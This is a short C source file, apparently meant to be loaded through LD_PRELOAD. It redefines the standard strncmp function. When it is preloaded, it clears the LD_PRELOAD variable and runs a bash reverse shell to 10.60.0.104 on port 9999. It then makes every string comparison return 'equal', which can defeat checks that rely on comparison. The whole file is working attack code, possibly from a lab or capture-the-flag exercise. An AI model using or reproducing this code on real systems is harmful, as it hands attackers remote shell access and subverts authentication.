#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void payload() {
    system("bash -c 'bash -i >& /dev/tcp/10.60.0.104/9999 0>&1'");
}

int strncmp(const char* __s1, const char* __s2, size_t __n) {
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();

    return 0;
}